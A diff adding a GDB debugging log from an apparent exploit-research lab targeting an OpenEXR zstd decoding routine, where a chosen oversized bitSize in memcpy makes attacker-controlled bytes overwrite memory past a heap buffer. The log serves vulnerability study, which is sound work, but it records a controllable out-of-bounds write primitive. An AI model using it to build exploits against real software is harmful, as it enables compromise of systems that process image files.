@@ -1,0 +1,14 @@
+Breakpoint 1 at 0x14a1: file /home/mesh-home/mishe-tauftauf2shell/lab/frontier/openexr2shell/harness/internal_zstd.c.vuln, line 472.
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+GUARD baseline split=0 total=64 unpacked=64 rc=0
+CASE baseline guard=absent total=64 b64=0xa5 b4095=0xa5
+GUARD oob-chosen split=0 total=4096 unpacked=64 rc=0
+
+Breakpoint 1, sort2_4ByteChannels_tiled (inPtr=0x5555555592f0 'Z' <repeats 200 times>..., num_samples_grid=0x7fffffffe118, channels=0x7fffffffe117, channelsSize=1, forward=false, height=1, outPtr=0x55555555a300 '\245' <repeats 200 times>..., sorting_lookup=0x7fffffffe120) at /home/mesh-home/mishe-tauftauf2shell/lab/frontier/openexr2shell/harness/internal_zstd.c.vuln:472
+472	                    memcpy (outPtr + readIndex, inPtr + writeIndex, bitSize);
+CHOICE bitSize=4096 n_hi=1024 readIndex=0 writeIndex=0
+0x5555555592f0:	0x5a	0x5a	0x5a	0x5a	0x5a	0x5a	0x5a	0x5a
+0x55555555a340:	0xa5	0xa5	0xa5	0xa5	0xa5	0xa5	0xa5	0xa5
+474	            row_byte_off += bitSize;
+0x55555555a340:	0x5a	0x5a	0x5a	0x5a	0x5a	0x5a	0x5a	0x5a
